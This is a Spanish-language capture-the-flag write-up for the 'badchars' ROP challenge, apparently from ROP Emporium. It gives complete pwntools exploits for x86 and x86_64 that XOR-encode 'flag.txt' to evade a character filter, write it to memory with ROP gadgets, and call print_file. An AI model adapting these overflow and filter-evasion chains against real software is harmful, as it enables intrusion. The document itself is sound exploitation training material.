# badchars

![2025-05-31-101801_1128x316_scrot](https://github.com/user-attachments/assets/e6d12eb4-fa50-452b-9996-8df9160d71dd)

## x86

Aqui tenemos que hacer lo mismo que en el reto anterior solo que esta vez algunos caracteres ('a','g','.','x') seran reemplazados por \xeb en la entrada.

El reto sugiere usar XOR para sobrepasar esto. El objetivo es introducir una cadena xoreada para sobrepasar las validaciones y luego hacerle xor de nuevo con la misma clave (xor es reversible: a ^ b ^ b = a) para escribir "flag.txt" en memoria.

Escribiremos igualmente en el segmento `.data`:
```
 rabin2 -S badchars32 | grep data
16  0x000005d8   0x14 0x080485d8   0x14 -r-- PROGBITS    .rodata
24  0x00001018    0x8 0x0804a018    0x8 -rw- PROGBITS    .data
```

Necesitamos un par de gadgets para escribir en memoria, estos dos nos sirven:
```
 0x080485b9          # pop esi; pop edi; pop ebp; ret
 0x0804854f          # mov dword [edi], esi
```

Y otro par de gadgets para xorear las cadena en memoria, como maximo pude encontrar xor byte a byte:
```
 gadget_xor1 = 0x080485bb            # pop ebp ; ret
 gadget_xor2 = 0x0804839d            # pop ebx ; ret
 gadget_xor3 = 0x08048547            # xor byte ptr [ebp], bl ; ret
```

Implementamos una funcion para hacer xor a "flag.txt" con alguna clave que no genere badchars, 0x2 genera 'dnce,vzv' asi que nos sirve:
```
  def xor_bytes(data: bytes, key: int = 0x2) -> bytes:
      return bytes([b ^ key for b in data])
```

Ya con esto lo unico que tenemos que agregar es un bucle que itere sobre las direcciones de `.data` haciendo xor a cada byte:
```
      for i in range(0,len(data)):
        p += p32(gadget_xor1)             
        p += p32(data_addr + i)                     #ebp
        p += p32(gadget_xor2)             
        p += p32(key)                               #ebx
        p += p32(gadget_xor3)                       
    return p
```

Exploit completo:
``` python3
from pwn import *
elf = context.binary = ELF("./badchars32")
io = process("./badchars32")

data_addr = 0x0804a018

gadget_write1 = 0x080485b9          # pop esi; pop edi; pop ebp; ret
gadget_write2 = 0x0804854f          # mov dword [edi], esi
gadget_xor1 = 0x080485bb            # pop ebp ; ret
gadget_xor2 = 0x0804839d            # pop ebx ; ret
gadget_xor3 = 0x08048547            # xor byte ptr [ebp], bl ; ret

badchars = ['x','g','a','.']
def write_in_data(data,key: int = 0x2):
    p = b""
    # Write "flag.txt"
    for i in range(0,len(data),4):
        chunk = data[i:i+4].ljust(4,b"\x00")
        p += p32(gadget_write1)
        p += p32(int.from_bytes(chunk,'little'))  #esi
        p += p32(data_addr + i)                   #edi
        p += p32(0)                               #ebp
        p += p32(gadget_write2)
    # Xor
    for i in range(0,len(data)):
        p += p32(gadget_xor1)             
        p += p32(data_addr + i)                     #ebp
        p += p32(gadget_xor2)             
        p += p32(key)                               #ebx
        p += p32(gadget_xor3)
    return p

def xor_bytes(data: bytes, key: int = 0x2) -> bytes:
    return bytes([b ^ key for b in data])


rop = ROP("./badchars")
payload = b"A" * 44
payload += write_in_data(xor_bytes(b"flag.txt"))  # write "flag.txt" en .data
payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"

io.recv()
io.sendline(payload)
io.interactive()
```


## x86_64

Sufri durante un buen rato tratando de descubrir porque el exploit no funcionaba especificamente en un byte de `.data`. Resulta ser que .data+7 contenia 0x2e o '.' (un badchar) en esa direccion, entonces no se puede escribir ahi porque el sanitizador lo reemplaza por \xeb. Por esta razon escribi en `.bss`, que tenia 8 bytes, rezando que el byte despues de este fuera un null byte.

Dejando eso de lado la implementacion es similar a x86; obtenemos los gadgets, hacemos el bucle xor y le pasamos la direccion como argumento a `print_file`:

Exploit:
``` python
from pwn import *
elf = context.binary = ELF("./badchars")
io = process("./badchars")

bss_addr =  0x00601038

gadget_write1 =  0x0040069c         # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget_write2 =  0x00400634         # mov qword ptr [r13], r12 ; ret


gadget_xor1 =  0x004006a0           # pop r14 ; pop r15 ; ret
gadget_xor2 =  0x00400628           # xor byte ptr [r15], r14b ; ret

pop_rdi =  0x004006a3               # pop rdi; ret


badchars = ['x','g','a','.']
def write_in_data(data,key: int = 0x2):
    p = b""
    # Write "flag.txt"
    for i in range(0,len(data),8):
        chunk = data[i:i+8].ljust(8,b"\x00")
        p += p64(gadget_write1)
        p += p64(int.from_bytes(chunk,'little'))  #r12
        p += p64(bss_addr + i)                   #r13
        p += p64(0)                               #r14
        p += p64(0)                               #r15
        p += p64(gadget_write2)
    # Xor
    for i in range(0,len(data)):
        p += p64(gadget_xor1)
        p += p64(key)                               #r14  
        p += p64(bss_addr + i)                     #r15
        p += p64(gadget_xor2)
    return p

def xor_bytes(data: bytes, key: int = 0x2) -> bytes:
    return bytes([b ^ key for b in data])


rop = ROP("./badchars")
payload = b"A" * 40
payload += write_in_data(xor_bytes(b"flag.txt"))  # write "flag.txt" en .data
payload += p64(pop_rdi)
payload += p64(bss_addr)              # "flag.txt"
payload += p64(elf.plt['print_file'])  # print_file("flag.txt")

io.recv()
io.sendline(payload)
io.interactive()
```

